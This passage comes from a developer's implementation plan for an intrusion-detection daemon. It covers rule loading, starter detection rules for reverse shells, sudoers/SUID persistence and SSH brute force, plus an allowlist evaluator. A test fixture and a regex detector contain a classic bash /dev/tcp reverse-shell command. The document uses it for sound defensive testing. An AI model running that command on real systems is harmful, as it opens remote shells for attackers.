        sys.modules.pop("fakepkg.rule_one", None)
    ids = [r.rule_id for r in rules]
    assert "fake.one" in ids


def test_loader_skips_modules_without_rule(tmp_path: Path) -> None:
    pkg = tmp_path / "fakepkg2"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("")
    (pkg / "no_rule.py").write_text("X = 1\n")
    sys.path.insert(0, str(tmp_path))
    try:
        rules = load_python_rules("fakepkg2")
    finally:
        sys.path.remove(str(tmp_path))
        for k in list(sys.modules):
            if k.startswith("fakepkg2"):
                sys.modules.pop(k)
    assert rules == []
```

Write `tests/rules/test_registry.py`:

```python
"""Tests for the Rule Registry."""

from __future__ import annotations

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext, Match
from inspectord.rules.registry import Registry


class _AlwaysFire:
    rule_id = "test.always"
    severity = "info"
    category = "test"

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        return [
            Match(
                rule_id=self.rule_id,
                severity=self.severity,
                category=self.category,
                dedup_key=f"{self.rule_id}:event:{ctx.event.event_id}",
                primary_entity_kind="event",
                primary_entity_key=ctx.event.event_id,
                short="fired",
                detail="fired",
            )
        ]


def test_registry_aggregates_matches() -> None:
    reg = Registry(yaml_rules=[], python_rules=[_AlwaysFire(), _AlwaysFire()])
    ev = build_event(module="m", action="a", category=["c"], type_=["t"], severity="info")
    matches = reg.evaluate(EvalContext(event=ev, history=[]))
    assert len(matches) == 2


def test_registry_empty() -> None:
    reg = Registry(yaml_rules=[], python_rules=[])
    ev = build_event(module="m", action="a", category=["c"], type_=["t"], severity="info")
    assert reg.evaluate(EvalContext(event=ev, history=[])) == []


def test_registry_rule_ids() -> None:
    reg = Registry(yaml_rules=[], python_rules=[_AlwaysFire()])
    assert reg.rule_ids() == ["test.always"]
```

- [ ] **Step 2: Confirm failures**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest tests/rules/test_python_loader.py tests/rules/test_registry.py -v
```

Expected: ImportErrors.

- [ ] **Step 3: Implement**

Write `inspectord/rules/python_loader.py`:

```python
"""Discovers Python plugin rules under a package.

Any module-level identifier named ``RULE`` that satisfies the Rule Protocol is
collected. ``RULES`` (a list) is also recognised for modules exposing multiple
rules.
"""

from __future__ import annotations

import importlib
import pkgutil
from typing import Any

from inspectord.rules.base import Rule


def _is_rule_like(obj: Any) -> bool:
    return all(hasattr(obj, attr) for attr in ("rule_id", "severity", "category", "evaluate"))


def load_python_rules(package_name: str) -> list[Rule]:
    """Walk ``package_name`` (must be importable) collecting RULE / RULES exports."""
    try:
        package = importlib.import_module(package_name)
    except ModuleNotFoundError:
        return []
    out: list[Rule] = []
    paths = getattr(package, "__path__", None)
    if paths is None:
        return out
    for mod in pkgutil.iter_modules(paths):
        full = f"{package_name}.{mod.name}"
        try:
            module = importlib.import_module(full)
        except Exception:  # noqa: BLE001 — bad plugin shouldn't crash the loader
            continue
        single = getattr(module, "RULE", None)
        if single is not None and _is_rule_like(single):
            out.append(single)
        many = getattr(module, "RULES", None)
        if isinstance(many, list):
            for item in many:
                if _is_rule_like(item):
                    out.append(item)
    return out
```

Write `inspectord/rules/registry.py`:

```python
"""Rule registry — combines YAML rules and Python rules."""

from __future__ import annotations

from dataclasses import dataclass, field

from inspectord.rules.base import EvalContext, Match, Rule
from inspectord.rules.yaml_loader import YamlRule, evaluate_yaml_rule


@dataclass
class Registry:
    yaml_rules: list[YamlRule] = field(default_factory=list)
    python_rules: list[Rule] = field(default_factory=list)

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        out: list[Match] = []
        for yr in self.yaml_rules:
            try:
                out.extend(evaluate_yaml_rule(yr, ctx))
            except Exception:  # noqa: BLE001 — a bad rule should not poison the run
                continue
        for pr in self.python_rules:
            try:
                out.extend(pr.evaluate(ctx))
            except Exception:  # noqa: BLE001
                continue
        return out

    def rule_ids(self) -> list[str]:
        ids = [yr.rule_id for yr in self.yaml_rules]
        ids += [pr.rule_id for pr in self.python_rules]
        return ids
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/rules/test_python_loader.py tests/rules/test_registry.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 5 new tests pass; total 202.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-04-python-loader-registry
git add inspectord/rules/python_loader.py inspectord/rules/registry.py \
        tests/rules/test_python_loader.py tests/rules/test_registry.py
git commit -m "feat(rules): Python plugin loader + Registry"
git push -u origin task-rules-04-python-loader-registry
gh pr create --base main --head task-rules-04-python-loader-registry \
  --title "feat(rules): plugin loader + registry" \
  --body "load_python_rules(package) discovers RULE / RULES exports under a package. Registry combines YAML rules + Python rules and runs evaluate(ctx) → list[Match], swallowing per-rule exceptions so a bad rule can't take down the engine."
```

---

## Task 5: Starter rule pack

**Files:**
- Create: `inspectord/rules/starter_pack/__init__.py`
- Create: `inspectord/rules/starter_pack/lolbin_reverse_shell.py`
- Create: `inspectord/rules/starter_pack/persistence_sudoers.yaml`
- Create: `inspectord/rules/starter_pack/persistence_new_suid.yaml`
- Create: `inspectord/rules/starter_pack/ssh_brute_force.py`
- Create: `tests/rules/starter_pack/__init__.py`
- Create: `tests/rules/starter_pack/test_lolbin_reverse_shell.py`
- Create: `tests/rules/starter_pack/test_persistence_sudoers.py`
- Create: `tests/rules/starter_pack/test_persistence_new_suid.py`
- Create: `tests/rules/starter_pack/test_ssh_brute_force.py`
- Modify: `pyproject.toml` (force-include starter_pack/ YAML files in wheel)

**Branch:** `task-rules-05-starter-pack`

Four rules, two Python plugins (LOLBin reverse-shell pattern, sshd brute-force time-window correlation) and two YAML rules (sudoers modified, new SUID file).

- [ ] **Step 1: Force-include starter_pack/ YAML in the wheel**

In `pyproject.toml`, extend the `[tool.hatch.build.targets.wheel.force-include]` block. Add the line:

```toml
"inspectord/rules/starter_pack" = "inspectord/rules/starter_pack"
```

(Preserve existing entries: `migrations_data`, `manifest_files`, `templates`.)

Then reinstall:

```bash
pip install -e '.[dev]'
```

- [ ] **Step 2: Write the LOLBin reverse-shell plugin + its tests**

Write `inspectord/rules/starter_pack/__init__.py`:

```python
"""Starter rule pack (spec §21)."""
```

Write `tests/rules/starter_pack/__init__.py`:

```python
```

Write `tests/rules/starter_pack/test_lolbin_reverse_shell.py`:

```python
"""Tests for the reverse-shell LOLBin rule."""

from __future__ import annotations

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext
from inspectord.rules.starter_pack.lolbin_reverse_shell import RULE


def test_fires_on_bash_dev_tcp_pattern() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 1234,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
    )
    matches = RULE.evaluate(EvalContext(event=ev, history=[]))
    assert len(matches) == 1
    assert matches[0].severity == "critical"
    assert matches[0].rule_id == "lolbin.bash_dev_tcp"
    assert "1.2.3.4" in matches[0].short


def test_does_not_fire_on_unrelated_bash() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={"pid": 1234, "name": "bash", "command_line": "bash -c 'echo ok'"},
    )
    assert RULE.evaluate(EvalContext(event=ev, history=[])) == []


def test_does_not_fire_for_non_bash_process() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 1234,
            "name": "python",
            "command_line": "python -c 'open(\"/dev/tcp/x/y\")'",
        },
    )
    # v1 of this rule is bash-specific.
    assert RULE.evaluate(EvalContext(event=ev, history=[])) == []
```

Write `inspectord/rules/starter_pack/lolbin_reverse_shell.py`:

```python
"""Bash reverse-shell pattern (bash -i >& /dev/tcp/...)."""

from __future__ import annotations

import re

from inspectord.rules.base import EvalContext, Match


_PATTERN = re.compile(r"bash\b.*-i\b.*>&\s*/dev/tcp/(?P<ip>[^/\s]+)/(?P<port>\d+)")


class _Rule:
    rule_id = "lolbin.bash_dev_tcp"
    name = "Reverse-shell pattern: bash -i >& /dev/tcp/..."
    severity = "critical"
    category = "intrusion_detection"
    why = (
        "bash -i >& /dev/tcp/... is the classic reverse-shell idiom. "
        "Possible false positives: pentest/CTF tools you ran yourself."
    )

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        ev = ctx.event
        if ev.module != "process_collector":
            return []
        proc = ev.process or {}
        if proc.get("name") != "bash":
            return []
        cmd = proc.get("command_line") or ""
        m = _PATTERN.search(cmd)
        if m is None:
            return []
        ip = m.group("ip")
        port = m.group("port")
        pid = proc.get("pid", "?")
        short = f"Reverse-shell pattern: bash → {ip}:{port} (pid {pid})"
        detail = (
            f"bash command line matched /dev/tcp pattern.\n"
            f"  pid: {pid}\n  command: {cmd}\n  destination: {ip}:{port}"
        )
        return [
            Match(
                rule_id=self.rule_id,
                rule_name=self.name,
                severity=self.severity,
                category=self.category,
                dedup_key=f"{self.rule_id}:pid:{pid}",
                primary_entity_kind="process",
                primary_entity_key=f"pid:{pid}",
                short=short,
                detail=detail,
                why=self.why,
                false_positives=["pentest/CTF tools you ran yourself"],
                triggering_event_ids=[ev.event_id],
                labels=["lolbin", "reverse-shell"],
            )
        ]


RULE = _Rule()
```

- [ ] **Step 3: Confirm LOLBin tests pass**

```bash
pytest tests/rules/starter_pack/test_lolbin_reverse_shell.py -v
```

Expected: 3 pass.

- [ ] **Step 4: Write the YAML rule for sudoers modification + its tests**

Write `inspectord/rules/starter_pack/persistence_sudoers.yaml`:

```yaml
version: 1.0.0
id: persistence.sudoers_modified
name: "sudoers file modified"
severity: high
category: persistence
why: |
  Modifying /etc/sudoers or /etc/sudoers.d/ grants persistent privileges.
  Common attacker-persistence technique.
false_positives:
  - "You ran visudo deliberately."
  - "A package post-install hook updated sudoers.d."
detect:
  any_of:
    - event.module == "fim_watcher" AND event.action == "file_modified" AND file.path == "/etc/sudoers"
    - event.module == "fim_watcher" AND event.action == "file_modified" AND file.path STARTSWITH "/etc/sudoers.d/"
    - event.module == "fim_watcher" AND event.action == "file_created" AND file.path STARTSWITH "/etc/sudoers.d/"
short: "sudoers modified: {file.path}"
detail: "FIM detected modification of {file.path}. Investigate via diff against last-known-good."
labels: [persistence, sudoers]
```

Write `tests/rules/starter_pack/test_persistence_sudoers.py`:

```python
"""Tests for the sudoers-modification rule."""

from __future__ import annotations

from importlib.resources import files

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext
from inspectord.rules.yaml_loader import evaluate_yaml_rule, load_yaml_rule


def _rule():
    pkg = files("inspectord.rules.starter_pack")
    path = pkg / "persistence_sudoers.yaml"
    # Use load_yaml_rule by writing to a tmp Path-compatible target.
    # Easiest: read the bytes and load via the dict path.
    import yaml as _yaml
    from inspectord.rules.yaml_loader import load_yaml_rule_from_dict
    data = _yaml.safe_load(path.read_text(encoding="utf-8"))
    return load_yaml_rule_from_dict(data, source=path.name)


def test_fires_on_sudoers_modify() -> None:
    rule = _rule()
    ev = build_event(
        module="fim_watcher",
        action="file_modified",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/etc/sudoers"},
    )
    matches = evaluate_yaml_rule(rule, EvalContext(event=ev, history=[]))
    assert matches
    assert matches[0].severity == "high"


def test_fires_on_sudoers_d_create() -> None:
    rule = _rule()
    ev = build_event(
        module="fim_watcher",
        action="file_created",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/etc/sudoers.d/extra"},
    )
    assert evaluate_yaml_rule(rule, EvalContext(event=ev, history=[]))


def test_does_not_fire_on_unrelated_file() -> None:
    rule = _rule()
    ev = build_event(
        module="fim_watcher",
        action="file_modified",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/home/eli/.bashrc"},
    )
    assert evaluate_yaml_rule(rule, EvalContext(event=ev, history=[])) == []
```

- [ ] **Step 5: Confirm sudoers tests pass**

```bash
pytest tests/rules/starter_pack/test_persistence_sudoers.py -v
```

Expected: 3 pass.

- [ ] **Step 6: Write the YAML rule for new SUID files + its tests**

Write `inspectord/rules/starter_pack/persistence_new_suid.yaml`:

```yaml
version: 1.0.0
id: persistence.new_suid_file
name: "New SUID file"
severity: high
category: persistence
why: |
  Any new SUID binary outside the system package set is a strong persistence
  indicator. Legitimate SUID binaries normally arrive via package manager,
  which the package_monitor (separate collector) will correlate later.
false_positives:
  - "Package install legitimately added a new SUID (verify via pacman -F)."
detect:
  any_of:
    - event.module == "fim_watcher" AND event.action == "file_created" AND file.setuid == "True"
    - event.module == "fim_watcher" AND event.action == "file_attributes_changed" AND file.setuid == "True"
short: "new SUID file: {file.path}"
detail: "FIM observed a file with setuid bit set: {file.path}. Owner: {file.owner}. Hash: {file.hash.sha256}."
labels: [persistence, suid]
```

Note: `file.setuid` from the file_enricher is a Python `bool`. The YAML expression evaluator compares with `"True"` because the rendered string value of `True` is `"True"`. The evaluator's `_coerce` will pass the bool through; the comparison `True == "True"` is `False` in Python. So we need to make YAML rules tolerate boolean values too. The simplest fix is to allow the literal `true` / `false` (lowercase) in YAML expressions and parse them.

**Patch the yaml_loader's `_parse_literal`** to also recognise `true` / `false` as booleans:

In `inspectord/rules/yaml_loader.py`, replace `_parse_literal`:

```python
def _parse_literal(raw: str) -> Any:
    raw = raw.strip()
    if raw.startswith('"') and raw.endswith('"'):
        return raw[1:-1]
    if raw.startswith("'") and raw.endswith("'"):
        return raw[1:-1]
    if raw == "true":
        return True
    if raw == "false":
        return False
    try:
        return int(raw)
    except ValueError:
        return raw
```

Then change the YAML rule to use lowercase `true`:

```yaml
    - event.module == "fim_watcher" AND event.action == "file_created" AND file.setuid == true
    - event.module == "fim_watcher" AND event.action == "file_attributes_changed" AND file.setuid == true
```

Write `tests/rules/starter_pack/test_persistence_new_suid.py`:

```python
"""Tests for the new-SUID rule."""

from __future__ import annotations

from importlib.resources import files

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext
from inspectord.rules.yaml_loader import evaluate_yaml_rule, load_yaml_rule_from_dict


def _rule():
    import yaml as _yaml
    pkg = files("inspectord.rules.starter_pack")
    path = pkg / "persistence_new_suid.yaml"
    return load_yaml_rule_from_dict(_yaml.safe_load(path.read_text(encoding="utf-8")), source=path.name)


def test_fires_on_setuid_file_create() -> None:
    rule = _rule()
    ev = build_event(
        module="fim_watcher",
        action="file_created",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/tmp/x", "setuid": True, "owner": 1000, "hash": {"sha256": "abc"}},
    )
    assert evaluate_yaml_rule(rule, EvalContext(event=ev, history=[]))


def test_does_not_fire_on_setuid_false() -> None:
    rule = _rule()
    ev = build_event(
        module="fim_watcher",
        action="file_created",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/tmp/x", "setuid": False},
    )
    assert evaluate_yaml_rule(rule, EvalContext(event=ev, history=[])) == []
```

- [ ] **Step 7: Confirm new-SUID tests pass**

```bash
pytest tests/rules/starter_pack/test_persistence_new_suid.py -v
```

Expected: 2 pass. Also re-run the YAML loader tests to confirm the boolean literal addition didn't break anything:

```bash
pytest tests/rules/test_yaml_loader.py -v
```

Expected: still 7 pass.

- [ ] **Step 8: Write the sshd brute-force plugin + its tests**

Write `tests/rules/starter_pack/test_ssh_brute_force.py`:

```python
"""Tests for the sshd brute-force rule."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext
from inspectord.rules.starter_pack.ssh_brute_force import RULE


def _failed_event(when: datetime, ip: str = "1.2.3.5") -> object:
    ev = build_event(
        module="log_tailer",
        action="ssh_login_failed",
        category=["authentication"],
        type_=["end"],
        severity="medium",
        outcome="failure",
        source={"ip": ip, "port": 51234},
    )
    return ev.model_copy(update={"ts": when})


def test_does_not_fire_below_threshold() -> None:
    now = datetime.now(UTC)
    history = [_failed_event(now - timedelta(seconds=5 * i)) for i in range(3)]
    matches = RULE.evaluate(EvalContext(event=history[0], history=history))
    assert matches == []


def test_fires_at_threshold() -> None:
    now = datetime.now(UTC)
    history = [_failed_event(now - timedelta(seconds=5 * i)) for i in range(5)]
    matches = RULE.evaluate(EvalContext(event=history[0], history=history))
    assert len(matches) == 1
    assert matches[0].severity == "high"
    assert matches[0].rule_id == "auth.ssh_brute_force"
    assert "1.2.3.5" in matches[0].short


def test_window_resets_outside_60s() -> None:
    now = datetime.now(UTC)
    history = [_failed_event(now)]
    # four old failures, way before the window
    history += [_failed_event(now - timedelta(minutes=10)) for _ in range(4)]
    matches = RULE.evaluate(EvalContext(event=history[0], history=history))
    assert matches == []


def test_does_not_count_other_ips() -> None:
    now = datetime.now(UTC)
    # 5 failures but from 5 different IPs
    history = [_failed_event(now - timedelta(seconds=i), ip=f"1.2.3.{i}") for i in range(5)]
    matches = RULE.evaluate(EvalContext(event=history[0], history=history))
    assert matches == []
```

Write `inspectord/rules/starter_pack/ssh_brute_force.py`:

```python
"""sshd brute force — 5x ssh_login_failed from same source.ip within 60s."""

from __future__ import annotations

from inspectord.rules.base import EvalContext, Match


_WINDOW_S = 60.0
_THRESHOLD = 5


class _Rule:
    rule_id = "auth.ssh_brute_force"
    name = "sshd brute-force from same source"
    severity = "high"
    category = "intrusion_detection"
    why = (
        f"{_THRESHOLD}+ failed ssh logins from the same source IP within "
        f"{_WINDOW_S:.0f}s. Common signature of a credential-stuffing or "
        f"dictionary attack."
    )

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        ev = ctx.event
        if ev.action != "ssh_login_failed":
            return []
        src_ip = (ev.source or {}).get("ip")
        if not src_ip:
            return []
        recent = ctx.recent_events(window_s=_WINDOW_S)
        count = sum(
            1
            for e in recent
            if e.action == "ssh_login_failed" and (e.source or {}).get("ip") == src_ip
        )
        if count < _THRESHOLD:
            return []
        short = f"ssh brute-force: {count} failed logins from {src_ip} in <{_WINDOW_S:.0f}s"
        detail = (
            f"Observed {count} ssh_login_failed events from source.ip={src_ip} "
            f"within the last {_WINDOW_S:.0f} seconds. Threshold is {_THRESHOLD}."
        )
        return [
            Match(
                rule_id=self.rule_id,
                rule_name=self.name,
                severity=self.severity,
                category=self.category,
                dedup_key=f"{self.rule_id}:ip:{src_ip}",
                primary_entity_kind="ip",
                primary_entity_key=str(src_ip),
                short=short,
                detail=detail,
                why=self.why,
                triggering_event_ids=[e.event_id for e in recent if e.action == "ssh_login_failed"],
                labels=["auth", "brute-force"],
            )
        ]


RULE = _Rule()
```

- [ ] **Step 9: Confirm sshd brute-force tests pass**

```bash
pytest tests/rules/starter_pack/test_ssh_brute_force.py -v
```

Expected: 4 pass.

- [ ] **Step 10: Final pass + lint**

```bash
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 12 new starter-pack tests pass + (possibly) updated yaml_loader tests; total 214.

- [ ] **Step 11: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-05-starter-pack
git add inspectord/rules/starter_pack/ tests/rules/starter_pack/ \
        inspectord/rules/yaml_loader.py pyproject.toml
git commit -m "feat(rules): starter pack (LOLBin/sudoers/SUID/sshd brute-force)"
git push -u origin task-rules-05-starter-pack
gh pr create --base main --head task-rules-05-starter-pack \
  --title "feat(rules): four starter-pack rules" \
  --body "Bundles four high-signal rules: bash reverse-shell (Python plugin, regex on command_line), sudoers modification (YAML), new SUID file (YAML, requires file.setuid bool), and sshd brute-force (Python plugin with 60s/5x window correlation). Also adds true/false literals to the YAML expression grammar and force-includes starter_pack/ YAML files in the wheel."
```

Wait for CI green; do NOT merge.

---

## Task 6: Allowlist file loader + scope evaluator

**Files:**
- Create: `inspectord/allowlist/__init__.py`
- Create: `inspectord/allowlist/file_loader.py`
- Create: `inspectord/allowlist/evaluator.py`
- Create: `tests/allowlist/__init__.py`
- Create: `tests/allowlist/test_file_loader.py`
- Create: `tests/allowlist/test_evaluator.py`
- Create: `packaging/allowlist.example.yaml`

**Branch:** `task-rules-06-allowlist`

The allowlist is **file-based** for Phase 1 (per spec §31). Loader reads `/etc/inspectord/allowlist.yaml`, validates against `AllowlistEntry` (already defined). Evaluator checks a candidate `Match` against the loaded entries; first match wins (spec §7.4 evaluation order).

- [ ] **Step 1: Failing tests**

Write `tests/allowlist/__init__.py`:

```python
```

Write `tests/allowlist/test_file_loader.py`:

```python
"""Tests for the allowlist file loader."""

from __future__ import annotations

from pathlib import Path

import pytest

from inspectord.allowlist.file_loader import (
    AllowlistFileError,
    load_allowlist_file,
    load_allowlist_from_path,
)


def test_loads_valid_yaml(tmp_path: Path) -> None:
    f = tmp_path / "allowlist.yaml"
    f.write_text(
        """
entries:
  - id: "01900000-0000-7000-8000-000000000000"
    schema_version: "1.0.0"
    scope:
      rule_id: lolbin.bash_dev_tcp
    reason: "Pentest tools I run on this box."
    created_by: eli@local
    created_at: "2026-05-24T14:23:10+00:00"
    auto_origin: false
    stats:
      suppressed_count: 0
      last_suppressed_at: null
""".lstrip()
    )
    entries = load_allowlist_from_path(f)
    assert len(entries) == 1
    assert entries[0].scope.rule_id == "lolbin.bash_dev_tcp"


def test_missing_file_returns_empty_list(tmp_path: Path) -> None:
    assert load_allowlist_from_path(tmp_path / "absent.yaml") == []


def test_invalid_yaml_raises(tmp_path: Path) -> None:
    f = tmp_path / "bad.yaml"
    f.write_text(": : :")
    with pytest.raises(AllowlistFileError):
        load_allowlist_from_path(f)


def test_load_allowlist_file_uses_default_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # Override the default path for the test.
    monkeypatch.setattr(
        "inspectord.allowlist.file_loader._DEFAULT_PATH",
        tmp_path / "allowlist.yaml",
    )
    (tmp_path / "allowlist.yaml").write_text("entries: []\n")
    assert load_allowlist_file() == []
```

Write `tests/allowlist/test_evaluator.py`:

```python
"""Tests for the allowlist evaluator."""

from __future__ import annotations

from datetime import UTC, datetime

from inspectord.allowlist.evaluator import is_suppressed
from inspectord.rules.base import Match
from inspectord.schemas.allowlist import AllowlistEntry, AllowlistScope, AllowlistStats


def _entry(scope: AllowlistScope) -> AllowlistEntry:
    return AllowlistEntry(
        id="x",
        scope=scope,
        reason="test",
        created_by="eli@local",
        created_at=datetime.now(UTC),
        auto_origin=False,
        stats=AllowlistStats(),
    )


def _match(*, rule_id: str = "lolbin.bash_dev_tcp",
           entity_kind: str = "process", entity_key: str = "pid:1234") -> Match:
    return Match(
        rule_id=rule_id,
        severity="high",
        category="test",
        dedup_key=f"{rule_id}:{entity_kind}:{entity_key}",
        primary_entity_kind=entity_kind,
        primary_entity_key=entity_key,
        short="m",
        detail="d",
    )


def test_rule_id_match_suppresses() -> None:
    entries = [_entry(AllowlistScope(rule_id="lolbin.bash_dev_tcp"))]
    assert is_suppressed(_match(), entries) is True


def test_rule_id_mismatch_does_not_suppress() -> None:
    entries = [_entry(AllowlistScope(rule_id="other.rule"))]
    assert is_suppressed(_match(), entries) is False


def test_entity_match_suppresses() -> None:
    from inspectord.schemas.alert import EntityRef

    entries = [_entry(AllowlistScope(entity=EntityRef(kind="process", key="pid:1234")))]
    assert is_suppressed(_match(), entries) is True


def test_path_glob_suppresses_file_entity() -> None:
    entries = [_entry(AllowlistScope(path_glob="/home/eli/dev/**"))]
    assert (
        is_suppressed(
            _match(entity_kind="file", entity_key="/home/eli/dev/project/x"),
            entries,
        )
        is True
    )


def test_path_glob_does_not_match_outside() -> None:
    entries = [_entry(AllowlistScope(path_glob="/home/eli/dev/**"))]
    assert (
        is_suppressed(
            _match(entity_kind="file", entity_key="/etc/sudoers"),
            entries,
        )
        is False
    )


def test_empty_allowlist_does_not_suppress() -> None:
    assert is_suppressed(_match(), []) is False
```

- [ ] **Step 2: Confirm failure**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest tests/allowlist/ -v
```

Expected: ImportErrors.

- [ ] **Step 3: Implement**

Write `inspectord/allowlist/__init__.py`:

```python
"""Allowlist file-loader + scope evaluator (spec §7.4)."""
```

Write `inspectord/allowlist/file_loader.py`:

```python
"""File-based allowlist loader (spec §31 Phase 1: file-based; UI later)."""

from __future__ import annotations

from pathlib import Path
from typing import Any

import yaml
from pydantic import ValidationError

from inspectord.schemas.allowlist import AllowlistEntry


_DEFAULT_PATH = Path("/etc/inspectord/allowlist.yaml")


class AllowlistFileError(RuntimeError):
    pass


def load_allowlist_from_path(path: Path) -> list[AllowlistEntry]:
    p = Path(path)
    if not p.exists():
        return []
    try:
        data = yaml.safe_load(p.read_text(encoding="utf-8"))
    except yaml.YAMLError as exc:
        raise AllowlistFileError(f"{p}: invalid YAML: {exc}") from exc
    if data is None:
        return []
    if not isinstance(data, dict) or "entries" not in data:
        raise AllowlistFileError(f"{p}: top-level must be a mapping with 'entries' list")
    raw_entries: Any = data["entries"]
    if not isinstance(raw_entries, list):
        raise AllowlistFileError(f"{p}: 'entries' must be a list")
    out: list[AllowlistEntry] = []
    for i, raw in enumerate(raw_entries):
        try:
            out.append(AllowlistEntry.model_validate(raw))
        except ValidationError as exc:
            raise AllowlistFileError(f"{p}: entry [{i}] invalid: {exc}") from exc
    return out


def load_allowlist_file() -> list[AllowlistEntry]:
    """Load the default allowlist file. Returns [] if missing."""
    return load_allowlist_from_path(_DEFAULT_PATH)
```

Write `inspectord/allowlist/evaluator.py`:

```python
"""Allowlist scope evaluator.

A Match is suppressed if ANY entry in the list matches it. Evaluation order
per spec §7.4: rule_id → entity → path_glob. Within an entry, the scope is
an AND of its non-None fields.
"""

from __future__ import annotations

import fnmatch

from inspectord.rules.base import Match
from inspectord.schemas.allowlist import AllowlistEntry


def is_suppressed(match: Match, entries: list[AllowlistEntry]) -> bool:
    for entry in entries:
        if _entry_matches(match, entry):
            return True
    return False


def _entry_matches(match: Match, entry: AllowlistEntry) -> bool:
    scope = entry.scope
    if scope.rule_id is not None and scope.rule_id != match.rule_id:
        return False
    if scope.entity is not None:
        if scope.entity.kind != match.primary_entity_kind:
            return False
        if scope.entity.key != match.primary_entity_key:
            return False
    if scope.path_glob is not None:
        # Path-glob check only meaningful when the primary entity is a file
        if match.primary_entity_kind != "file":
            return False
        if not fnmatch.fnmatch(match.primary_entity_key, _glob_to_fnmatch(scope.path_glob)):
            return False
    # All declared parts of the scope matched (and at least one was declared).
    return any([
        scope.rule_id is not None,
        scope.entity is not None,
        scope.path_glob is not None,
        scope.user_id is not None,
    ])


def _glob_to_fnmatch(glob: str) -> str:
    """Translate `**` (multi-segment) into fnmatch's `*` (works on full strings)."""
    return glob.replace("**", "*")
```

Write `packaging/allowlist.example.yaml`:

```yaml
# inspectord allowlist — installed to /etc/inspectord/allowlist.yaml
# Each entry suppresses Alerts whose rule_id / entity / path_glob match.
# Spec §7.4.
entries: []

# Example: suppress reverse-shell alerts for a single trusted process.
# entries:
#   - id: "01900000-0000-7000-8000-000000000000"
#     schema_version: "1.0.0"
#     scope:
#       rule_id: lolbin.bash_dev_tcp
#       entity:
#         kind: process
#         key: "pid:1234"
#     reason: "Pentest tool I run on this box."
#     created_by: eli@local
#     created_at: "2026-05-24T14:23:10+00:00"
#     auto_origin: false
#     stats:
#       suppressed_count: 0
#       last_suppressed_at: null
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/allowlist/ -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 10 new tests pass; total 224.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-06-allowlist
git add inspectord/allowlist/ tests/allowlist/ packaging/allowlist.example.yaml
git commit -m "feat(allowlist): file loader + scope evaluator + example YAML"
git push -u origin task-rules-06-allowlist
gh pr create --base main --head task-rules-06-allowlist \
  --title "feat(allowlist): file-based loader + scope evaluator" \
  --body "Loads /etc/inspectord/allowlist.yaml into AllowlistEntry models. is_suppressed(match, entries) returns True if any entry's scope matches the candidate Match (AND-of-declared-fields within an entry, OR across entries). Ships an example YAML template under packaging/."
```

Wait for CI green; do NOT merge.

---

## Task 7: Alert builder + dedup engine + lifecycle

**Files:**
- Create: `inspectord/alerts/__init__.py`
- Create: `inspectord/alerts/builder.py`
- Create: `inspectord/alerts/dedup.py`
- Create: `inspectord/alerts/lifecycle.py`
- Create: `tests/alerts/__init__.py`
- Create: `tests/alerts/test_builder.py`
- Create: `tests/alerts/test_dedup.py`
- Create: `tests/alerts/test_lifecycle.py`

**Branch:** `task-rules-07-alerts`

Three pure-function modules. `builder` converts a `Match` + the triggering `Event` into a full `Alert` (the schema already exists). `dedup` decides between "new row" and "update existing row's dedup_count + last_seen_at" based on a sliding window. `lifecycle` handles status transitions (validates a transition graph: `new → acknowledged|resolved|suppressed`, `acknowledged → resolved`, `resolved` is terminal, `suppressed` is terminal).

- [ ] **Step 1: Failing tests**

Write `tests/alerts/__init__.py`:

```python
```

Write `tests/alerts/test_builder.py`:

```python
"""Tests for the alert builder."""

from __future__ import annotations

from datetime import UTC, datetime

from inspectord.alerts.builder import build_alert
from inspectord.parsers.base import build_event
from inspectord.rules.base import Match


def test_build_alert_from_match() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={"pid": 1234, "name": "bash"},
    )
    m = Match(
        rule_id="lolbin.bash_dev_tcp",
        rule_name="Reverse-shell pattern",
        severity="critical",
        category="intrusion_detection",
        dedup_key="lolbin.bash_dev_tcp:pid:1234",
        primary_entity_kind="process",
        primary_entity_key="pid:1234",
        short="short",
        detail="detail",
        why="why text",
        false_positives=["fp1"],
        triggering_event_ids=[ev.event_id],
    )
    a = build_alert(match=m, event=ev)
    assert a.rule.id == "lolbin.bash_dev_tcp"
